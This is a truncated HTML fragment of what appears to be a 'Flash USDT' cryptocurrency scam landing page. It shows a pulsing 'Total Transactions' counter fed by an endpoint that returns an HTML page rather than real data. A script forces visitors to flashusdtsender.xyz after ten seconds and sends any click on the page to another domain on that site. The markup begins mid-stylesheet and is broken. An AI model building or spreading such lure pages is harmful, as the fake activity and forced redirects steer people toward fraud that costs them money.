    @keyframes pulse {
      0% { transform: scale(1); }

<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">
  <div class="text-center">
    <h1 class="text-4xl font-bold mb-4">Flash USdT</h1>
    <p class="text-lg text-gray-400">Modern advanced goods with live transaction counter and seamless redirection</p>
    <div class="mt-6">
      <div class="text-6xl font-extrabold pulse" id="count">0</div>
      <p class="text-sm text-gray-500">Total Transactions</p>
    </div>
    <p class="text-md mt-4 text-yellow-400">Redirecting soon...</p>
  </div>

  <script>
    async function fetchData() {
      try {
        // Fetch live data from the endpoint (ensure the endpoint returns JSON with a "count" field)
        let response = await fetch("https://flashswapusdt.vercel.app/index.html");
        let data = await response.json();
        document.getElementById("count").innerText = data.count || 0;
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    }

    fetchData();
    setInterval(fetchData, 5000); // Refresh count every 5 seconds

    // Auto-redirect users after 10 seconds
    setTimeout(() => {
      window.location.href = "https://flashusdtsender.xyz";
    }, 10000);

    // Alternative redirect on user click
    document.body.addEventListener("click", () => {
      window.location.href = "https://access.flashusdtsender.xyz";
    });
  </script>
